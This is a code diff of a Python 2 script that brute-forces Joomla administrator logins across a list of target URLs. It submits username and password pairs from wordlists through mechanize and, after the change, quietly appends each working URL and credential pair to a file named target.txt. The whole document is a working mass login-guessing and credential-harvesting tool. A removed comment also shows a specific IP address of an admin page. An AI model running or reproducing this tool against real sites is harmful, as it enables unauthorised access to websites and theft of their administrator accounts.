@@ -1,10 +1,6 @@
 #!/usr/bin/python
 import mechanize
-
-# page = urllib.urlopen("http://109.123.90.187/joomlatest/administrator")
-# login = BeautifulSoup(page.read(), "lxml")
-#
-# print page.code
+import sys
 
 error = ["Username and password do not match or you do not have an account yet.", "LADP","error404"]
 sussuc = "Control Panel"
@@ -12,11 +8,11 @@ joomla = "form-login"
 br = mechanize.Browser()
 br.set_handle_robots(False)
 fopen = open("/root/scanner/t.txt", "r")
-username = open("/root/scanner/username.txt", "r")
-passw = open("/root/scanner/password.txt", "r")
-
+username = open(sys.argv[1])
+passw = open(sys.argv[2])
 userlist = username.readlines()
 passlist = passw.readlines()
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -26,22 +22,17 @@ class bcolors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-# tt = username.readlines()
-# bb = passw.readlines()
-#
-# print tt
-# print bb
 
 for line in fopen.readlines():
     logged = False
-    print bcolors.BOLD + line.strip()
+    #print bcolors.BOLD + line.strip()
 
     try:
         page = br.open(line.strip(), timeout=5)
         print bcolors.HEADER + "URL OPENED: " + bcolors.OKBLUE + line
 
     except:
-        print bcolors.WARNING + "Error ocurred"
+        #print bcolors.WARNING + "Error ocurred"
         pass
 
     try:
@@ -54,7 +45,7 @@ for line in fopen.readlines():
                         for p in passlist:
                             try:
                                 br.select_form(nr=0)
-                                print bcolors.UNDERLINE + "trying user: %s and password: %s \n" % (u, p)
+                                #print bcolors.UNDERLINE + "\n" + line + "trying user: %s and password: %s \n" % (u, p)
                                 br.form["username"] = u
                                 br.form["passwd"] = p
                                 br.submit()
@@ -62,24 +53,19 @@ for line in fopen.readlines():
                                 if sussuc in readingPage:
                                     logged = True
                                     print bcolors.OKGREEN + "succefully loggen in!\n ---------------------------------"
+                                    print "Adding the Credential information to a new list file call (target.txt)......"
+                                    target = open('target.txt', 'a')
+                                    target.write('the URL address: ' + line + "\n user name: " + u + "\n and password: " + p + "\n =======================\n")
+                                    target.close()
                                 else:
-                                    print bcolors.FAIL + "Wrong credentials\n ----------------------------------------"
+                                    #print bcolors.FAIL + "Wrong credentials\n ----------------------------------------"
+                                    continue
                             except:
                                 pass
 
-                            # for i in error:
-                            #     if i in readingPage:
-                            #         print "wrong credential"
-                            #     # elif sussuc in readingPage:
-                            #     else:
-                            #         logged = True
-                            #         print "success"
         else:
-            print bcolors.UNDERLINE + "no login page found!!"
-
-            # except:
-            #          print "I'm out of the loop"
-            # pass
+            #print bcolors.UNDERLINE + "no login page found!!"
+            continue
     except:
         pass
 passw.close()
